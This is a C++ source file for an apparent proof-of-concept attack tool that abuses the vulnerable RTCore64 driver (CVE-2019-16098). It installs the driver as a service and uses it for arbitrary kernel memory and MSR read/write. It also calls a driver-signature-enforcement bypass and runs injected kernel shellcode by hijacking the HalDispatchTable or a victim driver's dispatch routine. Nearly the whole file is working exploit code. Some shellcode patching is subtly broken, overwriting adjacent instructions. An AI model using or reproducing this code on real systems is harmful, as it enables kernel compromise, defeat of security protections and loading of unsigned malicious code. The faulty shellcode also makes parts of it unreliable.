/**
 * @file RTCoreProvider.cpp
 * @author Gregory King
 * @date August 13, 2025
 * @brief Simple working implementation of the RTCoreProvider class.
 */

#include "RTCoreProvider.h"
#include "../Resources/DriverDataManager.h"
#include "../DSE.h"
#include "../Utils.h"
#include "../Syscall.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>
#define NOMINMAX
#include <Windows.h>
#include <winternl.h>
#include <algorithm>
#include <algorithm>

namespace KernelMode {
    namespace Providers {

        // Static provider load data for RTCore64
        ProviderLoadData RTCoreProvider::loadData = {
            false,  // PhysMemoryBruteForce (RTCore reads Virtual)
            false,  // PML4FromLowStub
            false,  // PreferPhysical
            false,  // RequiresDSE
            CAPABILITY_VIRTUAL_MEMORY, // Supports direct virtual memory R/W
            L"RTCore64 - MSI Afterburner driver (CVE-2019-16098)"
        };

        RTCoreProvider::RTCoreProvider() 
            : deviceHandle(INVALID_HANDLE_VALUE), serviceHandle(nullptr), pml4Base(0) {
        }

        RTCoreProvider::~RTCoreProvider() {
            Deinitialize();
        }

        bool RTCoreProvider::Initialize(ULONG driverId, bool bypassDSE) {
            std::wcout << L"[+] Initializing RTCoreProvider..." << std::endl;

            // Try to initialize the driver data manager
            auto& driverManager = Resources::DriverDataManager::GetInstance();
            if (!driverManager.Initialize()) {
                std::wcerr << L"[-] Failed to initialize driver data manager." << std::endl;
                return false;
            }

            // Perform DSE bypass if requested
            if (bypassDSE) {
                std::wcout << L"[*] Attempting DSE bypass..." << std::endl;
                if (!BypassDSE()) {
                    std::wcerr << L"[-] DSE bypass failed, continuing anyway..." << std::endl;
                }
            }

            // Try to extract and load the RTCore64 driver
            if (!DropDriver()) {
                std::wcerr << L"[-] Failed to extract RTCore64 driver." << std::endl;
                return false;
            }

            // Install the driver as a service
            if (!InstallDriverService()) {
                std::wcerr << L"[-] Failed to install RTCore64 service." << std::endl;
                return false;
            }

            // Open device handle for communication
            if (!OpenDeviceHandle()) {
                std::wcerr << L"[-] Failed to open RTCore64 device handle." << std::endl;
                return false;
            }

            std::wcout << L"[+] RTCoreProvider initialized successfully." << std::endl;
            return true;
        }

        std::wstring RTCoreProvider::GetProviderName() const {
            return L"RTCore";
        }

        void RTCoreProvider::Deinitialize() {
            std::wcout << L"[+] Deinitializing RTCoreProvider..." << std::endl;

            if (deviceHandle != INVALID_HANDLE_VALUE) {
                CloseHandle(deviceHandle);
                deviceHandle = INVALID_HANDLE_VALUE;
                std::wcout << L"[+] RTCore64 device handle closed." << std::endl;
            }

            if (serviceHandle) {
                // Stop the service
                SERVICE_STATUS serviceStatus;
                ControlService(serviceHandle, SERVICE_CONTROL_STOP, &serviceStatus);
                
                // Delete the service (SKIPPED FOR DEBUG)
                // DeleteService(serviceHandle);
                CloseServiceHandle(serviceHandle);
                serviceHandle = nullptr;
                std::wcout << L"[+] RTCore64 service stopped." << std::endl;
            }

            // Clean up temporary driver file (SKIPPED FOR DEBUG)
            /*
            if (!driverPath.empty()) {
                DeleteFileW(driverPath.c_str());
                std::wcout << L"[+] Temporary driver file cleaned up." << std::endl;
            }
            */
        }

        bool RTCoreProvider::ReadKernelMemory(uintptr_t address, void* buffer, size_t size) {
            if (deviceHandle == INVALID_HANDLE_VALUE) {
                return false;
            }

            // RTCore supports direct Virtual Memory reading via IOCTL_RTCORE_READVM
            uint8_t* bufferPtr = static_cast<uint8_t*>(buffer);
            size_t bytesRead = 0;

            while (bytesRead < size) {
                uint32_t readSize = (std::min)(4u, static_cast<uint32_t>(size - bytesRead));
                
                RTCORE_REQUEST request = { 0 };
                request.Address = address + bytesRead;
                request.Size = readSize;
                
                DWORD bytesReturned;
                if (!DeviceIoControl(
                    deviceHandle, 
                    IOCTL_RTCORE_READVM, 
                    &request, 
                    sizeof(request), 
                    &request, // Output is in the same struct
                    sizeof(request), 
                    &bytesReturned, 
                    nullptr)) 
                {
                    return false;
                }

                memcpy(bufferPtr + bytesRead, &request.Value, readSize);
                bytesRead += readSize;
            }

            return true;
        }

        bool RTCoreProvider::WriteKernelMemory(uintptr_t address, void* buffer, size_t size) {
            if (deviceHandle == INVALID_HANDLE_VALUE) {
                return false;
            }

            // RTCore supports direct Virtual Memory writing via IOCTL_RTCORE_WRITEVM
            uint8_t* bufferPtr = static_cast<uint8_t*>(buffer);
            size_t bytesWritten = 0;

            while (bytesWritten < size) {
                uint32_t writeSize = (std::min)(4u, static_cast<uint32_t>(size - bytesWritten));
                uint32_t value = 0;

                memcpy(&value, bufferPtr + bytesWritten, writeSize);

                RTCORE_REQUEST request = { 0 };
                request.Address = address + bytesWritten;
                request.Size = writeSize;
                request.Value = value;
                
                DWORD bytesReturned;
                if (!DeviceIoControl(
                    deviceHandle, 
                    IOCTL_RTCORE_WRITEVM, 
                    &request, 
                    sizeof(request), 
                    nullptr, 
                    0, 
                    &bytesReturned, 
                    nullptr)) 
                {
                    return false;
                }

                bytesWritten += writeSize;
            }

            return true;
        }

        bool RTCoreProvider::DropDriver() {
            std::wcout << L"[+] Extracting RTCore64 driver..." << std::endl;
            
            auto& driverManager = Resources::DriverDataManager::GetInstance();
            
            // Construct path next to executable
            wchar_t exePath[MAX_PATH];
            if (GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
                std::filesystem::path p(exePath);
                driverPath = (p.parent_path() / L"RTCore64.sys").wstring();
            } else {
                driverPath = L".\\RTCore64.sys";
            }
            
            // Use ExtractDriver to get the driver
            if (!driverManager.ExtractDriver(Resources::DRIVER_ID_RTCORE64, driverPath)) {
                std::wcerr << L"[-] Failed to extract RTCore64 driver to: " << driverPath << std::endl;
                return false;
            }
            
            std::wcout << L"[+] RTCore64 driver extracted to: " << driverPath << std::endl;
            return true;
        }

        bool RTCoreProvider::InstallDriverService() {
            std::wcout << L"[+] Installing RTCore64 service..." << std::endl;

            // Use Utils to create/start the service
            serviceHandle = Utils::CreateDriverService(serviceName, driverPath);
            if (!serviceHandle) {
                 std::wcerr << L"[-] Failed to install/start RTCore64 service." << std::endl;
                 return false;
            }

            std::wcout << L"[+] RTCore64 service installed and started successfully." << std::endl;
            return true;
        }

        bool RTCoreProvider::OpenDeviceHandle() {
            std::wcout << L"[+] Opening RTCore64 device handle (KDU-style)..." << std::endl;

            UNICODE_STRING deviceNameUnicode;
            RtlInitUnicodeString(&deviceNameUnicode, this->deviceName.c_str());
            
            OBJECT_ATTRIBUTES objAttr;
            InitializeObjectAttributes(&objAttr, &deviceNameUnicode, OBJ_CASE_INSENSITIVE, NULL, NULL);

            IO_STATUS_BLOCK ioStatusBlock;
            bool useFallback = false;

            // Use syscall directly for authentic behavior
            DWORD ntCreateFileSyscall = Syscall::GetInstance().GetSyscallIndex("NtCreateFile");
            if (ntCreateFileSyscall == -1) {
                std::wcerr << L"[-] Failed to resolve NtCreateFile syscall." << std::endl;
                useFallback = true;
            } else {
                // KDU exact parameters
                PVOID params[] = {
                    &this->deviceHandle,
                    (PVOID)(SYNCHRONIZE | WRITE_DAC | GENERIC_WRITE | GENERIC_READ),
                    &objAttr,
                    &ioStatusBlock,
                    nullptr,
                    (PVOID)0,
                    (PVOID)0,
                    (PVOID)FILE_OPEN,
                    (PVOID)(FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE),
                    nullptr,
                    (PVOID)0
                };

                NTSTATUS status = DoSyscall(ntCreateFileSyscall, params, 11);

                if (!NT_SUCCESS(status)) {
                    std::wcerr << L"[-] NtCreateFile syscall failed with status: 0x" << std::hex << status << std::dec << std::endl;
                    useFallback = true;
                } else {
                     std::wcout << L"[+] Connected via NtCreateFile." << std::endl;
                }
            }

            if (useFallback) {
                std::wcout << L"[*] Attempting fallback to CreateFileW..." << std::endl;
                SetLastError(0);
                
                // Construct proper user-mode path: \\.\RTCore64
                std::wstring userModePath = L"\\\\.\\RTCore64";
                
                 deviceHandle = CreateFileW(
                    userModePath.c_str(), 
                    GENERIC_READ | GENERIC_WRITE,
                    0,
                    nullptr,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    nullptr
                );

                if (deviceHandle == INVALID_HANDLE_VALUE) {
                     // Try alternate name
                     std::wstring altPath = L"\\\\.\\RTCore";
                     deviceHandle = CreateFileW(
                        altPath.c_str(), 
                        GENERIC_READ | GENERIC_WRITE,
                        0,
                        nullptr,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL,
                        nullptr
                    );
                }
                
                DWORD err = GetLastError();
                {
                     std::ofstream debug("C:\\Users\\admin\\Documents\\Visual Studio 2022\\Projects\\BYOVD-POC\\debug_output.txt", std::ios::app);
                     if (debug.is_open()) {
                         debug << "[RTCore] CreateFileW attempted. Handle: " << deviceHandle << " Error: " << err << std::endl;
                     }
                }
            } else {
                 std::ofstream debug("C:\\Users\\admin\\Documents\\Visual Studio 2022\\Projects\\BYOVD-POC\\debug_output.txt", std::ios::app);
                 if (debug.is_open()) {
                     debug << "[RTCore] NtCreateFile path taken. Handle: " << deviceHandle << std::endl;
                 }
            }

            if (deviceHandle == INVALID_HANDLE_VALUE) {
                std::wcerr << L"[-] Failed to open RTCore64 device. Error: " << GetLastError() << std::endl;
                return false;
            }

            std::wcout << L"[+] RTCore64 device handle opened successfully." << std::endl;
            return true;
        }

        bool RTCoreProvider::ReadPhysical(uintptr_t physicalAddress, uint32_t& value, uint32_t size) {
            // RTCore driver does not expose a direct Physical Read IOCTL.
            // Some versions might, but assuming Virtual Read is safer.
            return false;
        }

        bool RTCoreProvider::WritePhysical(uintptr_t physicalAddress, uint32_t value, uint32_t size) {
            // RTCore driver does not expose a direct Physical Write IOCTL.
            return false;
        }

        uintptr_t RTCoreProvider::VirtualToPhysical(uintptr_t virtualAddress) {
            // Page walking requires ReadPhysical, which is not natively supported by this provider
            // without complex mapping techniques. 
            // Since we have direct Virtual Read/Write, we don't strictly need this.
            return 0;
        }

        bool RTCoreProvider::ReadPhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
           return false;
        }

        bool RTCoreProvider::WritePhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
            return false;
        }

        bool RTCoreProvider::ReadMsr(ULONG msrIndex, ULONG64* value) {
            if (!deviceHandle || deviceHandle == INVALID_HANDLE_VALUE) return false;
            
            DWORD bytesReturned = 0;
            ULONG inputIndex = msrIndex;
            
            // Output is 8 bytes (low, high)
            struct {
                ULONG LowPart;
                ULONG HighPart;
            } output = { 0 };

            // IOCTL_RTCORE64_READ_MSR = 0x80002030
            if (!DeviceIoControl(deviceHandle, 0x80002030, 
                &inputIndex, sizeof(inputIndex), 
                &output, sizeof(output), 
                &bytesReturned, nullptr)) {
                return false;
            }

            *value = ((ULONG64)output.HighPart << 32) | output.LowPart;
            return true;
        }

        bool RTCoreProvider::WriteMsr(ULONG msrIndex, ULONG64 value) {
            if (!deviceHandle || deviceHandle == INVALID_HANDLE_VALUE) return false;

            DWORD bytesReturned = 0;
            struct {
                ULONG MsrIndex;
                ULONG LowPart;
                ULONG HighPart;
            } input;
            
            input.MsrIndex = msrIndex;
            input.LowPart = (ULONG)(value & 0xFFFFFFFF);
            input.HighPart = (ULONG)(value >> 32);

            // IOCTL_RTCORE64_WRITE_MSR = 0x80002034
            return DeviceIoControl(deviceHandle, 0x80002034, 
                &input, sizeof(input), 
                nullptr, 0, 
                &bytesReturned, nullptr);
        }

        bool RTCoreProvider::BypassDSE() {
            std::wcout << L"[+] RTCoreProvider::BypassDSE - Attempting DSE bypass..." << std::endl;

            DSE dse(this);
            return dse.Disable();
        }

        ULONG RTCoreProvider::GetCapabilities() const {
            return loadData.Capabilities;
        }

        const ProviderLoadData* RTCoreProvider::GetLoadData() const {
            return &loadData;
        }

        uintptr_t RTCoreProvider::AllocateKernelMemory(size_t size, uintptr_t* physicalAddress) {
            if (!deviceHandle || deviceHandle == INVALID_HANDLE_VALUE) {
                std::wcerr << L"[-] Provider not initialized" << std::endl;
                return 0;
            }

            // Real kernel memory allocation using RTCore64 Virtual memory access
            // resolved via GetKernelExport
            
            uintptr_t ntoskrnlBase = Utils::GetKernelModuleBase("ntoskrnl.exe");
            if (!ntoskrnlBase) return 0;
            
            uintptr_t exAllocatePoolWithTag = Utils::GetKernelExport(ntoskrnlBase, "ExAllocatePoolWithTag");
            if (!exAllocatePoolWithTag) return 0;

            // KDU-style shellcode for kernel memory allocation
            BYTE allocShellcode[] = {
                0x48, 0x83, 0xEC, 0x28,                     // sub rsp, 28h
                0x48, 0x31, 0xC9,                           // xor rcx, rcx (NonPagedPool = 0)
                0x48, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00,   // mov rdx, size
                0x49, 0xC7, 0xC0, 0x52, 0x54, 0x43, 0x4F,   // mov r8, 'RTCO'
                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, ExAllocatePoolWithTag
                0xFF, 0xD0,                                 // call rax
                0x48, 0x83, 0xC4, 0x28,                     // add rsp, 28h
                0xC3                                        // ret
            };

            *(ULONG64*)&allocShellcode[10] = size;
            *(ULONG64*)&allocShellcode[19] = exAllocatePoolWithTag;

            // Execute shellcode 
            uintptr_t allocatedAddr = ExecuteKernelShellcodeRTCore(allocShellcode, sizeof(allocShellcode));
            
            if (!allocatedAddr) {
                std::wcerr << L"[-] Failed to allocate kernel memory" << std::endl;
                return 0;
            }
            
            if (physicalAddress) {
                *physicalAddress = 0; // Not supported
            }

            std::wcout << L"[+] Real kernel memory allocated: 0x" << std::hex 
                      << allocatedAddr << L" (size: " << std::dec << size << L")" << std::endl;
            
            return allocatedAddr;
        }

        bool RTCoreProvider::FreeKernelMemory(uintptr_t virtualAddress, size_t size) {
            if (!deviceHandle || deviceHandle == INVALID_HANDLE_VALUE) {
                std::wcerr << L"[-] Provider not initialized" << std::endl;
                return false;
            }

            // Real kernel memory deallocation using RTCore64 physical memory access
            // Based on KDU-style ExFreePoolWithTag via RTCore64 interface
            
            // First, resolve ExFreePoolWithTag from ntoskrnl.exe
            uintptr_t ntoskrnlBase = Utils::GetKernelModuleBase("ntoskrnl.exe");
            if (!ntoskrnlBase) {
                std::wcerr << L"[-] Failed to get ntoskrnl.exe base address" << std::endl;
                return false;
            }
            
            uintptr_t exFreePoolWithTag = Utils::GetKernelExport(ntoskrnlBase, "ExFreePoolWithTag");
            if (!exFreePoolWithTag) {
                std::wcerr << L"[-] Failed to resolve ExFreePoolWithTag" << std::endl;
                return false;
            }

            // KDU-style shellcode for kernel memory deallocation via RTCore64
            BYTE freeShellcode[] = {
                0x48, 0x83, 0xEC, 0x28,                     // sub rsp, 28h (shadow space)
                0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00,   // mov rcx, virtualAddress (dynamic)
                0x00, 0x00, 0x00, 0x00,                     // high dword of address
                0x49, 0xC7, 0xC0, 0x52, 0x54, 0x43, 0x4F,   // mov r8, 'RTCO' tag (RTCore)
                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, ExFreePoolWithTag
                0xFF, 0xD0,                                 // call rax
                0x48, 0x83, 0xC4, 0x28,                     // add rsp, 28h
                0xC3                                        // ret
            };

            // Patch virtual address and function address into shellcode
            *(ULONG64*)&freeShellcode[7] = virtualAddress;
            *(ULONG64*)&freeShellcode[19] = exFreePoolWithTag;

            // Execute shellcode in kernel space via RTCore64
            uintptr_t result = ExecuteKernelShellcodeRTCore(freeShellcode, sizeof(freeShellcode));
            
            if (result != 0) {
                std::wcout << L"[+] Real kernel memory freed (RTCore64): 0x" << std::hex 
                          << virtualAddress << L" (size: " << std::dec << size << L")" << std::endl;
                return true;
            } else {
                std::wcerr << L"[-] Failed to free kernel memory via RTCore64" << std::endl;
                return false;
            }
        }

        bool RTCoreProvider::CreateSystemThread(uintptr_t startAddress, uintptr_t parameter) {
            if (!deviceHandle || deviceHandle == INVALID_HANDLE_VALUE) {
                std::wcerr << L"[-] Provider not initialized" << std::endl;
                return false;
            }

            // Real system thread creation using RTCore64 physical memory access
            // Based on KDU-style PsCreateSystemThread via RTCore64 interface
            
            // First, resolve PsCreateSystemThread from ntoskrnl.exe
            uintptr_t ntoskrnlBase = Utils::GetKernelModuleBase("ntoskrnl.exe");
            if (!ntoskrnlBase) {
                std::wcerr << L"[-] Failed to get ntoskrnl.exe base address" << std::endl;
                return false;
            }
            
            uintptr_t psCreateSystemThread = Utils::GetKernelExport(ntoskrnlBase, "PsCreateSystemThread");
            if (!psCreateSystemThread) {
                std::wcerr << L"[-] Failed to resolve PsCreateSystemThread" << std::endl;
                return false;
            }

            // KDU-style shellcode for system thread creation via RTCore64
            // PsCreateSystemThread parameters: ThreadHandle, DesiredAccess, ObjectAttributes, 
            // ProcessHandle, ClientId, StartRoutine, StartContext
            BYTE threadShellcode[] = {
                0x48, 0x83, 0xEC, 0x48,                     // sub rsp, 48h (shadow space + locals)
                0x48, 0x8D, 0x4C, 0x24, 0x40,               // lea rcx, [rsp+40h] (ThreadHandle)
                0x48, 0x31, 0xD2,                           // xor rdx, rdx (DesiredAccess = 0)
                0x4D, 0x31, 0xC0,                           // xor r8, r8 (ObjectAttributes = NULL)
                0x4D, 0x31, 0xC9,                           // xor r9, r9 (ProcessHandle = NULL for system)
                0x48, 0x31, 0xC0,                           // xor rax, rax
                0x48, 0x89, 0x44, 0x24, 0x20,               // mov [rsp+20h], rax (ClientId = NULL)
                0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, // mov [rsp+28h], StartRoutine
                0x00, 0x00, 0x00, 0x00,                     // high dword
                0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, // mov [rsp+30h], StartContext
                0x00, 0x00, 0x00, 0x00,                     // high dword
                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, PsCreateSystemThread
                0xFF, 0xD0,                                 // call rax
                0x48, 0x83, 0xC4, 0x48,                     // add rsp, 48h
                0xC3                                        // ret
            };

            // Patch addresses into shellcode
            *(ULONG64*)&threadShellcode[33] = startAddress;     // StartRoutine
            *(ULONG64*)&threadShellcode[46] = parameter;        // StartContext
            *(ULONG64*)&threadShellcode[59] = psCreateSystemThread; // Function address

            // Execute shellcode in kernel space via RTCore64
            uintptr_t result = ExecuteKernelShellcodeRTCore(threadShellcode, sizeof(threadShellcode));
            
            if (result == 0) { // STATUS_SUCCESS
                std::wcout << L"[+] Real system thread created (RTCore64): start=0x" << std::hex 
                          << startAddress << L", param=0x" << parameter << std::endl;
                return true;
            } else {
                std::wcerr << L"[-] Failed to create system thread via RTCore64 (NTSTATUS: 0x" 
                          << std::hex << result << L")" << std::endl;
                return false;
            }
        }

        // Helper to find the address of HalDispatchTable
        uintptr_t GetHalDispatchTable() {
            uintptr_t ntosBase = Utils::GetKernelModuleBase("ntoskrnl.exe");
            if (!ntosBase) return 0;
            return Utils::GetKernelExport(ntosBase, "HalDispatchTable");
        }

        void RTCoreProvider::SetVictimDetails(const std::wstring& devName, const std::wstring& servName) {
            this->victimDeviceName = devName;
            this->victimServiceName = servName;
        }

        uintptr_t FindCodeCave(RTCoreProvider* provider, uintptr_t moduleBase, size_t size) {
            if (!moduleBase) return 0;
            const size_t SCAN_LIMIT = 0x500000;
            const size_t CHUNK_SIZE = 0x1000;
            std::vector<uint8_t> buffer(CHUNK_SIZE);
            size_t consecutiveCC = 0;
            uintptr_t caveStart = 0;
            
            for (size_t offset = 0x1000; offset < SCAN_LIMIT; offset += CHUNK_SIZE) {
                if (!provider->ReadKernelMemory(moduleBase + offset, buffer.data(), CHUNK_SIZE)) continue;
                for (size_t i = 0; i < CHUNK_SIZE; i++) {
                    if (buffer[i] == 0xCC) {
                        if (consecutiveCC == 0) caveStart = moduleBase + offset + i;
                        consecutiveCC++;
                        if (consecutiveCC >= size) return caveStart;
                    } else consecutiveCC = 0;
                }
            }
            return 0;
        }

        uintptr_t RTCoreProvider::ExecuteKernelShellcodeRTCore(BYTE* shellcode, size_t size) {
            if (!deviceHandle || deviceHandle == INVALID_HANDLE_VALUE) return 0;

            bool useVictim = !victimDeviceName.empty();
            uintptr_t targetBase = useVictim ? Utils::GetKernelModuleBase(std::filesystem::path(victimServiceName).filename().string() + ".sys") : Utils::GetKernelModuleBase("ntoskrnl.exe");
            if (!targetBase && useVictim) targetBase = Utils::GetKernelModuleBase(std::string(victimServiceName.begin(), victimServiceName.end()));

            const size_t STUB_SIZE = 11;
            // Scan for cave in target
            uintptr_t codeCave = FindCodeCave(this, targetBase, size + STUB_SIZE + 8);
            if (!codeCave) {
                // Fallback to ntoskrnl if victim failed or wasn't used
                if (useVictim) {
                     std::wcerr << L"[!] Cave not found in Victim, falling back to ntoskrnl" << std::endl;
                     targetBase = Utils::GetKernelModuleBase("ntoskrnl.exe");
                     codeCave = FindCodeCave(this, targetBase, size + STUB_SIZE + 8);
                     useVictim = false; // Cannot use victim execution if cave is in NTOS usually (due to relative calls or just safe practice)
                }
                if (!codeCave && targetBase) codeCave = targetBase + 0x200000; // Risky fallback
            }
            if (!codeCave) return 0;

            uintptr_t resultLoc = codeCave + size + STUB_SIZE;
            std::vector<BYTE> payload(shellcode, shellcode + size);
            if (payload.back() == 0xC3) payload.pop_back();
            
            payload.push_back(0x48); payload.push_back(0xA3);
            for (int i = 0; i < 8; ++i) payload.push_back((resultLoc >> (i * 8)) & 0xFF);
            payload.push_back(0xC3);

            if (!WriteKernelMemory(codeCave, payload.data(), payload.size())) return 0;

            if (useVictim) {
                HANDLE hV = CreateFileW(victimDeviceName.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
                if (hV != INVALID_HANDLE_VALUE) {
                    uintptr_t fObj = Utils::GetKernelObjectAddress(hV);
                    if (fObj) {
                        uintptr_t devObj = 0, drvObj = 0;
                        ReadKernelMemory(fObj + 0x8, &devObj, 8);
                        if (devObj) ReadKernelMemory(devObj + 0x8, &drvObj, 8);
                        if (drvObj) {
                            uintptr_t irpSlot = drvObj + 0x70 + (14 * 8);
                            uintptr_t orig = 0;
                            ReadKernelMemory(irpSlot, &orig, 8);
                            WriteKernelMemory(irpSlot, &codeCave, 8);
                            DWORD d;
                            DeviceIoControl(hV, 0x1337, NULL, 0, NULL, 0, &d, NULL);
                            WriteKernelMemory(irpSlot, &orig, 8);
                            std::wcout << L"[+] Executed via Victim Driver: " << victimDeviceName << std::endl;
                        }
                    }
                    CloseHandle(hV);
                }
            } else {
                uintptr_t hal = GetHalDispatchTable();
                if (hal) {
                    uintptr_t hook = hal + 8;
                    uintptr_t orig = 0;
                    ReadKernelMemory(hook, &orig, 8);
                    WriteKernelMemory(hook, &codeCave, 8);
                    typedef NTSTATUS(WINAPI* PNtQuery)(DWORD, PULONG);
                    auto NtQ = (PNtQuery)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryIntervalProfile");
                    if (NtQ) { ULONG d; NtQ(2, &d); }
                    WriteKernelMemory(hook, &orig, 8);
                }
            }

            uintptr_t res = 0;
            ReadKernelMemory(resultLoc, &res, 8);
            return res;
        }

    } // namespace Providers
} // namespace KernelMode
